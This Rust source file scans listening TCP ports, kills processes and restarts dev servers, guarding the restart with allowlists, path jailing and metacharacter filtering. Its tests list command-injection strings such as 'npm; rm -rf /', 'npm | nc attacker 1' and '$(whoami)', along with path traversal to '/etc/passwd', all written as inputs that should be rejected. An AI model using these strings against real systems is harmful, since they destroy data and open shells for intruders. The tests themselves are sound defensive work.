use once_cell::sync::Lazy;
use serde::Serialize;
use std::collections::{HashMap, HashSet};
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::Mutex;
use sysinfo::System;

#[derive(Serialize, Clone)]
pub struct PortInfo {
    pub port: u16,
    pub pid: u32,
    pub process_name: String,
    pub project_path: Option<String>,
    pub project_name: Option<String>,
    pub protocol: String,
    pub start_cmd: Option<String>,
}

// ─── Entry point (platform router) ───────────────────────────────────────────

pub fn scan_ports() -> Vec<PortInfo> {
    let mut sys = System::new();
    sys.refresh_processes();

    // Rebuilt from scratch on every scan so stale (port, pid) pairs cannot be
    // restarted after the owning process is gone or the pid has been reused.
    let mut trusted: TrustedLaunches = HashMap::new();

    #[cfg(target_os = "windows")]
    let ports = scan_windows(&sys, &mut trusted);

    #[cfg(any(target_os = "macos", target_os = "linux"))]
    let ports = scan_unix(&sys, &mut trusted);

    if let Ok(mut store) = trusted_launches().lock() {
        *store = trusted;
    }

    ports
}

pub fn kill_pid(pid: u32) -> Result<(), String> {
    #[cfg(target_os = "windows")]
    return kill_windows(pid);

    #[cfg(any(target_os = "macos", target_os = "linux"))]
    return kill_unix(pid);
}

// ─── Windows ─────────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn scan_windows(sys: &System, trusted: &mut TrustedLaunches) -> Vec<PortInfo> {
    let output = Command::new("netstat")
        .args(["-ano"])
        .output()
        .expect("failed to run netstat");

    let stdout = String::from_utf8_lossy(&output.stdout);
    let mut ports: Vec<PortInfo> = Vec::new();
    let mut seen_entries: HashSet<(u16, u32)> = HashSet::new();

    for line in stdout.lines() {
        if !line.contains("LISTENING") { continue; }
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() < 5 { continue; }

        let port: u16 = match parts[1].rsplit(':').next()
            .and_then(|p| p.parse().ok()) {
            Some(p) => p,
            None => continue,
        };

        let pid: u32 = match parts[4].parse() {
            Ok(p) => p,
            Err(_) => continue,
        };

        if pid == 0 || seen_entries.contains(&(port, pid)) { continue; }
        seen_entries.insert((port, pid));

        let mut process_name = format!("PID {}", pid);
        let mut project_path = None;
        let mut start_cmd = None;

        if let Some(process) = sys.process(sysinfo::Pid::from(pid as usize)) {
            let p_name = process.name().to_string();
            if !p_name.trim().is_empty() {
                process_name = p_name;
            }

            let cmd_arr = process.cmd();
            let cmd_str = cmd_arr.join(" ");

            if !cmd_str.trim().is_empty() {
                start_cmd = Some(cmd_str.trim().to_string());
            }

            if let Some(cwd) = process.cwd() {
                project_path = find_project_root(cwd).map(|p| p.to_string_lossy().to_string());
            }

            if project_path.is_none() {
                if let Some(exe) = process.exe() {
                    if let Some(parent) = exe.parent() {
                        project_path = find_project_root(parent).map(|p| p.to_string_lossy().to_string());
                    }
                }
            }

            if let Some(record) = build_launch_record(cmd_arr, process.cwd()) {
                trusted.insert((port, pid), record);
            }
        }

        let project_name = extract_project_name(&project_path);

        ports.push(PortInfo {
            port, pid, process_name,
            project_path, project_name,
            protocol: "TCP".into(),
            start_cmd,
        });
    }

    ports.sort_by_key(|p| p.port);
    ports
}

#[cfg(target_os = "windows")]
fn kill_windows(pid: u32) -> Result<(), String> {
    let output = Command::new("taskkill")
        .args(["/PID", &pid.to_string(), "/F"])
        .output()
        .map_err(|e| e.to_string())?;

    if output.status.success() { Ok(()) }
    else { Err(String::from_utf8_lossy(&output.stderr).to_string()) }
}

// ─── macOS + Linux (shared lsof path) ────────────────────────────────────────

#[cfg(any(target_os = "macos", target_os = "linux"))]
fn scan_unix(sys: &System, trusted: &mut TrustedLaunches) -> Vec<PortInfo> {
    let output = Command::new("lsof")
        .args(["-iTCP", "-sTCP:LISTEN", "-n", "-P"])
        .output()
        .expect("failed to run lsof — is it installed?");

    let stdout = String::from_utf8_lossy(&output.stdout);
    let mut ports: Vec<PortInfo> = Vec::new();
    let mut seen_entries: HashSet<(u16, u32)> = HashSet::new();

    for line in stdout.lines().skip(1) {
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() < 9 { continue; }

        let mut process_name = parts[0].to_string();
        let pid: u32 = match parts[1].parse() {
            Ok(p) => p,
            Err(_) => continue,
        };

        let mut idx = parts.len() - 1;
        if parts[idx].starts_with('(') {
            idx -= 1;
        }
        let name = parts[idx];
        let port: u16 = match name.rsplit(':').next()
            .and_then(|p| p.parse().ok()) {
            Some(p) => p,
            None => continue,
        };

        if seen_entries.contains(&(port, pid)) { continue; }
        seen_entries.insert((port, pid));

        let mut project_path = None;
        let mut start_cmd = None;

        if let Some(process) = sys.process(sysinfo::Pid::from(pid as usize)) {
            let sys_name = process.name().to_string();
            if !sys_name.is_empty() { process_name = sys_name; }

            if let Some(cwd) = process.cwd() {
                project_path = find_project_root(cwd).map(|p| p.to_string_lossy().to_string());
            }

            let cmd = process.cmd().join(" ");
            if !cmd.trim().is_empty() {
                start_cmd = Some(cmd);
            }

            if let Some(record) = build_launch_record(process.cmd(), process.cwd()) {
                trusted.insert((port, pid), record);
            }
        }

        if project_path.is_none() {
            project_path = get_project_path_unix_fallback(pid);
        }

        let project_name = extract_project_name(&project_path);

        ports.push(PortInfo {
            port, pid, process_name,
            project_path, project_name,
            protocol: "TCP".into(),
            start_cmd,
        });
    }

    ports.sort_by_key(|p| p.port);
    ports
}

#[cfg(any(target_os = "macos", target_os = "linux"))]
fn get_project_path_unix_fallback(pid: u32) -> Option<String> {
    #[cfg(target_os = "linux")]
    {
        let cwd = std::fs::read_link(format!("/proc/{}/cwd", pid)).ok()?;
        find_project_root(std::path::Path::new(&cwd)).map(|p| p.to_string_lossy().to_string())
    }

    #[cfg(target_os = "macos")]
    {
        let output = Command::new("lsof")
            .args(["-p", &pid.to_string(), "-a", "-d", "cwd", "-Fn"])
            .output()
            .ok()?;

        let s = String::from_utf8_lossy(&output.stdout);
        let cwd = s.lines()
            .find(|l| l.starts_with('n') && l.len() > 1)
            .map(|l| l[1..].to_string())?;

        find_project_root(std::path::Path::new(&cwd))
            .map(|p| p.to_string_lossy().to_string())
    }
}

#[cfg(any(target_os = "macos", target_os = "linux"))]
fn kill_unix(pid: u32) -> Result<(), String> {
    unsafe { libc::kill(pid as i32, libc::SIGTERM); }
    std::thread::sleep(std::time::Duration::from_secs(2));

    if process_exists_unix(pid) {
        unsafe { libc::kill(pid as i32, libc::SIGKILL); }
    }
    Ok(())
}

#[cfg(any(target_os = "macos", target_os = "linux"))]
fn process_exists_unix(pid: u32) -> bool {
    unsafe { libc::kill(pid as i32, 0) == 0 }
}

// ─── Shared helpers ───────────────────────────────────────────────────────────

fn find_project_root(start: &std::path::Path) -> Option<std::path::PathBuf> {
    let markers = [
        "package.json", "Cargo.toml", "go.mod",
        "pyproject.toml", "requirements.txt",
        "pom.xml", "build.gradle", ".git",
    ];
    let mut dir = start.to_path_buf();
    for _ in 0..6 {
        for marker in &markers {
            if dir.join(marker).exists() {
                return Some(dir);
            }
        }
        if !dir.pop() { break; }
    }
    None
}

fn extract_project_name(path: &Option<String>) -> Option<String> {
    path.as_ref()
        .and_then(|p| std::path::Path::new(p).file_name())
        .and_then(|n| n.to_str())
        .map(|s| s.to_string())
}

// ─── Trusted restart ─────────────────────────────────────────────────────────
//
// The frontend may never hand the backend a command line or a working
// directory: an attacker with script execution in the webview would otherwise
// own the user's account. Instead every scan records vetted launch metadata for
// the processes it observed, keyed by (port, pid), and `restart_trusted` is
// only allowed to replay one of those records.

/// Launch metadata captured from a live process during a scan. Never built
/// from IPC input.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct LaunchRecord {
    /// argv[0] exactly as the OS reported it.
    pub program: String,
    /// argv[1..] exactly as the OS reported it.
    pub args: Vec<String>,
    /// Canonical working directory, always inside `root`.
    pub cwd: PathBuf,
    /// Canonical project root that jails `cwd` (and absolute programs).
    pub root: PathBuf,
}

type TrustedLaunches = HashMap<(u16, u32), LaunchRecord>;

fn trusted_launches() -> &'static Mutex<TrustedLaunches> {
    static TRUSTED: Lazy<Mutex<TrustedLaunches>> = Lazy::new(|| Mutex::new(HashMap::new()));
    &TRUSTED
}

/// Interpreters a dev server is allowed to be relaunched through when the
/// program lives outside the project root (e.g. a global node install).
const ALLOWED_PROGRAMS: &[&str] = &[
    "node", "npm", "npx", "pnpm", "yarn", "bun", "deno", "cargo", "python", "python3", "go",
];

/// Anything a shell could interpret. We never invoke a shell, but rejecting
/// these keeps the door shut if a future caller ever does.
const FORBIDDEN_CHARS: &[char] = &[
    '&', '|', ';', '$', '`', '(', ')', '<', '>', '"', '\'', '*', '?', '~', '#', '%', '!', '{',
    '}', '[', ']', '^', '\n', '\r', '\t',
];

/// Rejects a token that a shell (or a path walker) could reinterpret.
pub fn reject_unsafe_token(token: &str, kind: &str) -> Result<(), String> {
    if token.is_empty() {
        return Err(format!("empty {}", kind));
    }
    if let Some(bad) = token.chars().find(|c| FORBIDDEN_CHARS.contains(c) || c.is_control()) {
        return Err(format!("{} contains an unsafe character {:?}", kind, bad));
    }
    if token.split(['/', '\\']).any(|part| part == "..") {
        return Err(format!("{} contains a parent-directory traversal", kind));
    }
    Ok(())
}

/// True for `\\server\share` style paths, which escape any local jail.
fn is_unc(path: &Path) -> bool {
    #[cfg(target_os = "windows")]
    {
        use std::path::{Component, Prefix};
        if let Some(Component::Prefix(prefix)) = path.components().next() {
            return matches!(prefix.kind(), Prefix::UNC(..) | Prefix::VerbatimUNC(..));
        }
        false
    }
    #[cfg(not(target_os = "windows"))]
    {
        path.to_string_lossy().starts_with("\\\\")
    }
}

/// Canonicalizes `dir` and asserts it resolves to an existing directory under
/// `root`. Rejects traversal, UNC, `~`, and unexpanded environment variables.
fn canonicalize_jailed(dir: &Path, root: &Path) -> Result<PathBuf, String> {
    let raw = dir.to_string_lossy();
    if raw.is_empty() {
        return Err("working directory is empty".into());
    }
    if raw.contains('~') || raw.contains('%') || raw.contains('$') || raw.contains('\0') {
        return Err("working directory contains an unexpanded or unsafe token".into());
    }
    // Note: `is_unc` inspects the path prefix, so Windows verbatim disk paths
    // (`\\?\C:\…`, what `canonicalize` returns) are not mistaken for UNC.
    if is_unc(dir) {
        return Err("working directory is a UNC path".into());
    }
    if dir
        .components()
        .any(|c| matches!(c, std::path::Component::ParentDir))
    {
        return Err("working directory contains a parent-directory traversal".into());
    }

    let canonical = std::fs::canonicalize(dir)
        .map_err(|e| format!("working directory does not resolve: {}", e))?;
    if !canonical.is_dir() {
        return Err("working directory is not a directory".into());
    }
    if is_unc(&canonical) {
        return Err("working directory resolves to a UNC path".into());
    }
    if !canonical.starts_with(root) {
        return Err("working directory escapes the project root".into());
    }
    Ok(canonical)
}

/// Matches `program`'s file name against [`ALLOWED_PROGRAMS`], refusing any
/// executable extension that Windows would run through a shell (`.bat`/`.cmd`).
fn program_basename_allowed(program: &str) -> bool {
    let Some(name) = Path::new(program).file_name().and_then(|n| n.to_str()) else {
        return false;
    };
    let lower = name.to_ascii_lowercase();
    let stem = lower.strip_suffix(".exe").unwrap_or(&lower);
    if stem.contains('.') {
        return false; // .bat, .cmd, .ps1, … are shell-interpreted launchers
    }
    ALLOWED_PROGRAMS.contains(&stem)
}

/// Full re-validation of a record. Run when the record is built *and* again
/// immediately before spawning, so a stale store cannot outlive the filesystem.
pub fn validate_launch_record(record: &LaunchRecord) -> Result<(), String> {
    reject_unsafe_token(&record.program, "program")?;
    for arg in &record.args {
        reject_unsafe_token(arg, "argument")?;
    }

    if !record.root.is_absolute() || is_unc(&record.root) {
        return Err("project root is not a local absolute path".into());
    }
    if !record.cwd.starts_with(&record.root) {
        return Err("working directory escapes the project root".into());
    }
    canonicalize_jailed(&record.cwd, &record.root)?;

    let program = Path::new(&record.program);
    if program.is_absolute() {
        let canonical = std::fs::canonicalize(program)
            .map_err(|e| format!("program does not resolve: {}", e))?;
        if is_unc(&canonical) {
            return Err("program resolves to a UNC path".into());
        }
        // An absolute program is allowed either because it is a known
        // interpreter, or because it lives inside the jail.
        if !program_basename_allowed(&record.program) && !canonical.starts_with(&record.root) {
            return Err(format!(
                "program {:?} is neither an allowed interpreter nor inside the project root",
                record.program
            ));
        }
    } else if Path::new(&record.program).components().count() != 1 {
        return Err("relative program paths are not allowed".into());
    } else if !program_basename_allowed(&record.program) {
        return Err(format!("program {:?} is not an allowed interpreter", record.program));
    }

    Ok(())
}

/// Builds a vetted record from what the OS reported about a live process.
/// Returns `None` (restart simply stays unavailable) whenever anything about
/// the process fails validation — the fail-closed path.
fn build_launch_record(cmd: &[String], cwd: Option<&Path>) -> Option<LaunchRecord> {
    let program = cmd.first()?.trim().to_string();
    if program.is_empty() {
        return None;
    }
    let args: Vec<String> = cmd.iter().skip(1).map(|a| a.to_string()).collect();

    let cwd = cwd?;
    let root = std::fs::canonicalize(find_project_root(cwd)?).ok()?;
    let cwd = canonicalize_jailed(cwd, &root).ok()?;

    let record = LaunchRecord { program, args, cwd, root };
    validate_launch_record(&record).ok()?;
    Some(record)
}

/// Spawns a vetted record directly — no `cmd /C`, no `sh -c`, no string
/// splitting. On Windows the child gets its own console so a dev server stays
/// visible, without routing through a command interpreter.
fn spawn_trusted(record: &LaunchRecord) -> Result<(), String> {
    let mut command = Command::new(&record.program);
    command.args(&record.args).current_dir(&record.cwd);

    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        const CREATE_NEW_CONSOLE: u32 = 0x0000_0010;
        command.creation_flags(CREATE_NEW_CONSOLE);
    }

    command.spawn().map(|_| ()).map_err(|e| e.to_string())
}

/// True when `pid` is still listening on `port`.
fn port_is_listening(port: u16, pid: u32) -> bool {
    scan_ports().iter().any(|p| p.port == port && p.pid == pid)
}

/// Restarts the process recorded for `(port, pid)` during the last scan.
///
/// The only inputs from the frontend are the port and the pid; everything that
/// reaches the OS comes from the trusted store. Shared by `lib.rs` and
/// `main.rs` so both entry points behave identically.
pub fn restart_trusted(port: u16, pid: u32) -> Result<(), String> {
    let record = trusted_launches()
        .lock()
        .map_err(|_| "trusted launch store is poisoned".to_string())?
        .get(&(port, pid))
        .cloned()
        .ok_or_else(|| {
            format!("no trusted launch record for port {} (pid {}); rescan and try again", port, pid)
        })?;

    // The store may have been recorded seconds or hours ago; re-check it
    // against the filesystem before anything is executed.
    validate_launch_record(&record)?;

    // If the process is still alive it must be the same process we recorded —
    // otherwise the pid was reused and killing it would hit a bystander.
    let mut sys = System::new();
    sys.refresh_processes();
    if let Some(process) = sys.process(sysinfo::Pid::from(pid as usize)) {
        let live: Vec<String> = process.cmd().to_vec();
        let recorded: Vec<String> = std::iter::once(record.program.clone())
            .chain(record.args.iter().cloned())
            .collect();
        if live != recorded {
            return Err(format!("pid {} no longer matches the recorded launch", pid));
        }
        if !port_is_listening(port, pid) {
            return Err(format!("pid {} no longer listens on port {}", pid, port));
        }
        kill_pid(pid)?;
        std::thread::sleep(std::time::Duration::from_millis(800));
    }

    spawn_trusted(&record)
}

// ─── Test helpers (pure, no OS calls) ───────────────────────────────────────

#[cfg(test)]
pub(crate) fn parse_netstat_port(addr: &str) -> Option<u16> {
    addr.rsplit(':').next()?.parse().ok()
}

#[cfg(test)]
pub(crate) fn parse_lsof_name_parts(parts: &[&str]) -> Option<u16> {
    if parts.len() < 9 {
        return None;
    }
    let mut idx = parts.len() - 1;
    if parts[idx].starts_with('(') {
        if idx == 0 {
            return None;
        }
        idx -= 1;
    }
    let name = parts[idx];
    name.rsplit(':').next()?.parse().ok()
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::tempdir;

    #[test]
    fn extract_project_name_some() {
        let p = Some("C:/Users/123da/PycharmProjects/PortPal".to_string());
        assert_eq!(extract_project_name(&p), Some("PortPal".to_string()));
        let p2 = Some("C:/a/b/c".to_string());
        assert_eq!(extract_project_name(&p2), Some("c".to_string()));
    }

    #[test]
    fn extract_project_name_none() {
        assert_eq!(extract_project_name(&None), None);
        let p = Some("".to_string());
        // Path::new("").file_name() == None
        assert_eq!(extract_project_name(&p), None);
    }

    #[test]
    fn find_project_root_direct_marker() {
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("package.json"), "{}").unwrap();
        let sub = dir.path().join("a/b");
        fs::create_dir_all(&sub).unwrap();
        let found = find_project_root(&sub);
        assert_eq!(found, Some(dir.path().to_path_buf()));
    }

    #[test]
    fn find_project_root_cargo_toml() {
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("Cargo.toml"), "[package]").unwrap();
        let found = find_project_root(dir.path());
        assert_eq!(found, Some(dir.path().to_path_buf()));
    }

    #[test]
    fn find_project_root_git_marker() {
        let dir = tempdir().unwrap();
        fs::create_dir(dir.path().join(".git")).unwrap();
        let found = find_project_root(dir.path());
        assert_eq!(found, Some(dir.path().to_path_buf()));
    }

    #[test]
    fn find_project_root_none_within_6_levels() {
        let dir = tempdir().unwrap();
        let deep = dir.path().join("a/b/c/d/e/f/g");
        fs::create_dir_all(&deep).unwrap();
        // marker only at top, but deep is 7 levels down -> not found
        fs::write(dir.path().join("package.json"), "{}").unwrap();
        let found = find_project_root(&deep);
        assert_eq!(found, None);
    }

    #[test]
    fn find_project_root_parent_traversal() {
        let dir = tempdir().unwrap();
        let lvl1 = dir.path().join("level1");
        let lvl2 = lvl1.join("level2");
        fs::create_dir_all(&lvl2).unwrap();
        fs::write(lvl1.join("go.mod"), "module x").unwrap();
        let found = find_project_root(&lvl2);
        assert_eq!(found, Some(lvl1));
    }

    #[test]
    fn parse_netstat_port_ipv4_and_ipv6() {
        assert_eq!(parse_netstat_port("0.0.0.0:3000"), Some(3000));
        assert_eq!(parse_netstat_port("127.0.0.1:5173"), Some(5173));
        assert_eq!(parse_netstat_port("[::]:1420"), Some(1420));
        assert_eq!(parse_netstat_port("10.0.0.5:49664"), Some(49664));
        assert_eq!(parse_netstat_port(":::8080"), Some(8080));
        assert_eq!(parse_netstat_port("invalid"), None);
        assert_eq!(parse_netstat_port("0.0.0.0:abc"), None);
    }

    #[test]
    fn parse_lsof_without_listen_suffix() {
        let parts: Vec<&str> = "node 1234 user 10u IPv4 0x... 0t0 TCP *:3000".split_whitespace().collect();
        assert_eq!(parse_lsof_name_parts(&parts), Some(3000));
    }

    #[test]
    fn parse_lsof_with_listen_suffix_pr8() {
        // PR #8: lsof appends "(LISTEN)" as separate token
        let line = "node 1234 user 10u IPv4 0x... 0t0 TCP *:3000 (LISTEN)";
        let parts: Vec<&str> = line.split_whitespace().collect();
        // The ports.len()-1 is "(LISTEN)", must fall back to previous token
        assert_eq!(parse_lsof_name_parts(&parts), Some(3000));
        let line2 = "com.apple 5678 user 11u IPv6 0x... 0t0 TCP [::1]:5173 (LISTEN)";
        let parts2: Vec<&str> = line2.split_whitespace().collect();
        assert_eq!(parse_lsof_name_parts(&parts2), Some(5173));
    }

    #[test]
    fn parse_lsof_too_short() {
        let parts: Vec<&str> = "a b c".split_whitespace().collect();
        assert_eq!(parse_lsof_name_parts(&parts), None);
    }

    // ─── Trusted restart ─────────────────────────────────────────────────

    fn project(dir: &tempfile::TempDir) -> PathBuf {
        fs::write(dir.path().join("package.json"), "{}").unwrap();
        fs::canonicalize(dir.path()).unwrap()
    }

    fn record(root: &Path, program: &str, args: &[&str]) -> LaunchRecord {
        LaunchRecord {
            program: program.to_string(),
            args: args.iter().map(|a| a.to_string()).collect(),
            cwd: root.to_path_buf(),
            root: root.to_path_buf(),
        }
    }

    #[test]
    fn reject_unsafe_token_blocks_shell_metacharacters() {
        for token in [
            "npm && calc.exe",
            "npm; rm -rf /",
            "npm | nc attacker 1",
            "$(whoami)",
            "`whoami`",
            "run > out.txt",
            "run < in.txt",
            "%APPDATA%",
            "~/evil",
            "dev*",
            "dev?",
            "a\nb",
            "a\"b",
            "a'b",
            "^cmd",
            "!DELAYED!",
            "{a,b}",
            "[a]",
            "#comment",
        ] {
            assert!(
                reject_unsafe_token(token, "argument").is_err(),
                "expected {:?} to be rejected",
                token
            );
        }
    }

    #[test]
    fn reject_unsafe_token_blocks_traversal_and_empty() {
        assert!(reject_unsafe_token("", "argument").is_err());
        assert!(reject_unsafe_token("../../etc/passwd", "argument").is_err());
        assert!(reject_unsafe_token("..\\..\\windows", "argument").is_err());
        assert!(reject_unsafe_token("a\0b", "argument").is_err());
    }

    #[test]
    fn reject_unsafe_token_allows_ordinary_arguments() {
        for token in ["run", "dev", "--port=5173", "src/index.js", "C:\\bin\\node.exe", "-m"] {
            assert!(reject_unsafe_token(token, "argument").is_ok(), "{:?}", token);
        }
    }

    #[test]
    fn program_basename_allowlist() {
        assert!(program_basename_allowed("npm"));
        assert!(program_basename_allowed("node"));
        assert!(program_basename_allowed("C:\\Program Files\\nodejs\\node.exe"));
        assert!(program_basename_allowed("/usr/local/bin/python3"));
        // Shell-interpreted launchers and anything off the list stay out.
        assert!(!program_basename_allowed("npm.cmd"));
        assert!(!program_basename_allowed("evil.bat"));
        assert!(!program_basename_allowed("payload.ps1"));
        assert!(!program_basename_allowed("cmd"));
        assert!(!program_basename_allowed("sh"));
        assert!(!program_basename_allowed("powershell.exe"));
    }

    #[test]
    fn validate_accepts_an_allowlisted_interpreter_inside_the_jail() {
        let dir = tempdir().unwrap();
        let root = project(&dir);
        assert!(validate_launch_record(&record(&root, "npm", &["run", "dev"])).is_ok());
    }

    #[test]
    fn validate_accepts_a_subdirectory_cwd() {
        let dir = tempdir().unwrap();
        let root = project(&dir);
        let sub = root.join("apps/web");
        fs::create_dir_all(&sub).unwrap();
        let mut rec = record(&root, "npm", &["run", "dev"]);
        rec.cwd = fs::canonicalize(&sub).unwrap();
        assert!(validate_launch_record(&rec).is_ok());
    }

    #[test]
    fn validate_rejects_metacharacters_in_program_and_args() {
        let dir = tempdir().unwrap();
        let root = project(&dir);
        assert!(validate_launch_record(&record(&root, "npm & calc", &[])).is_err());
        assert!(validate_launch_record(&record(&root, "npm", &["run", "dev && calc"])).is_err());
        assert!(validate_launch_record(&record(&root, "npm", &["$(id)"])).is_err());
    }

    #[test]
    fn validate_rejects_programs_that_are_not_allowlisted_or_jailed() {
        let dir = tempdir().unwrap();
        let root = project(&dir);
        assert!(validate_launch_record(&record(&root, "calc", &[])).is_err());
        assert!(validate_launch_record(&record(&root, "sh", &["-c", "id"])).is_err());
        // Relative paths never resolve against a predictable directory.
        assert!(validate_launch_record(&record(&root, "./evil", &[])).is_err());
        assert!(validate_launch_record(&record(&root, "sub/evil", &[])).is_err());
    }

    #[test]
    fn validate_accepts_an_absolute_program_inside_the_jail() {
        let dir = tempdir().unwrap();
        let root = project(&dir);
        // Use the non-verbatim path the OS would actually report for argv[0].
        let binary = dir.path().join("server");
        fs::write(&binary, "").unwrap();
        let rec = record(&root, binary.to_str().unwrap(), &[]);
        assert!(validate_launch_record(&rec).is_ok());
    }

    #[test]
    fn validate_rejects_an_absolute_program_outside_the_jail() {
        let dir = tempdir().unwrap();
        let root = project(&dir);
        let outside = tempdir().unwrap();
        let binary = outside.path().join("evil");
        fs::write(&binary, "").unwrap();
        let rec = record(&root, binary.to_str().unwrap(), &[]);
        assert!(validate_launch_record(&rec).is_err());
    }

    #[test]
    fn validate_rejects_a_cwd_outside_the_jail() {
        let dir = tempdir().unwrap();
        let root = project(&dir);
        let outside = tempdir().unwrap();
        let mut rec = record(&root, "npm", &["run", "dev"]);
        rec.cwd = fs::canonicalize(outside.path()).unwrap();
        assert!(validate_launch_record(&rec).is_err());
    }

    #[test]
    fn validate_rejects_a_nonexistent_cwd() {
        let dir = tempdir().unwrap();
        let root = project(&dir);
        let mut rec = record(&root, "npm", &["run", "dev"]);
        rec.cwd = root.join("does-not-exist");
        assert!(validate_launch_record(&rec).is_err());
    }

    #[test]
    fn canonicalize_jailed_rejects_traversal_unc_and_expansions() {
        let dir = tempdir().unwrap();
        let root = project(&dir);
        let sub = root.join("app");
        fs::create_dir_all(&sub).unwrap();

        assert!(canonicalize_jailed(&sub, &root).is_ok());
        assert!(canonicalize_jailed(&sub.join("../.."), &root).is_err());
        assert!(canonicalize_jailed(Path::new("\\\\evil\\share"), &root).is_err());
        assert!(canonicalize_jailed(Path::new("~/projects"), &root).is_err());
        assert!(canonicalize_jailed(Path::new("%APPDATA%"), &root).is_err());
        assert!(canonicalize_jailed(Path::new("$HOME/x"), &root).is_err());
        assert!(canonicalize_jailed(Path::new(""), &root).is_err());
    }

    #[test]
    fn build_launch_record_captures_a_vetted_dev_server() {
        let dir = tempdir().unwrap();
        let root = project(&dir);
        let cmd: Vec<String> = ["npm", "run", "dev"].iter().map(|s| s.to_string()).collect();
        let rec = build_launch_record(&cmd, Some(&root)).expect("record");
        assert_eq!(rec.program, "npm");
        assert_eq!(rec.args, vec!["run".to_string(), "dev".to_string()]);
        assert_eq!(rec.cwd, root);
        assert_eq!(rec.root, root);
    }

    #[test]
    fn build_launch_record_fails_closed() {
        let dir = tempdir().unwrap();
        let root = project(&dir);
        // No project marker within the 6 levels above the cwd -> no jail -> no record.
        let bare = tempdir().unwrap();
        let unmarked = bare.path().join("a/b/c/d/e/f/g");
        fs::create_dir_all(&unmarked).unwrap();
        let cmd: Vec<String> = ["npm".to_string(), "run".to_string()].to_vec();
        assert!(build_launch_record(&cmd, Some(&unmarked)).is_none());
        // No cwd at all.
        assert!(build_launch_record(&cmd, None).is_none());
        // Empty argv.
        assert!(build_launch_record(&[], Some(&root)).is_none());
        // Disallowed program.
        let evil: Vec<String> = ["cmd".to_string(), "/C".to_string()].to_vec();
        assert!(build_launch_record(&evil, Some(&root)).is_none());
    }

    #[test]
    fn restart_trusted_refuses_an_unknown_port_and_pid() {
        let err = restart_trusted(65535, 4_294_967_290).unwrap_err();
        assert!(err.contains("no trusted launch record"), "{}", err);
    }

    #[test]
    fn dedupe_seen_entries() {
        let mut seen: HashSet<(u16, u32)> = HashSet::new();
        assert!(seen.insert((3000, 1234)));
        assert!(!seen.insert((3000, 1234))); // duplicate
        assert!(seen.insert((3000, 5678))); // same port, different pid
        assert!(seen.insert((5173, 1234))); // different port, same pid
        assert_eq!(seen.len(), 3);
    }
}
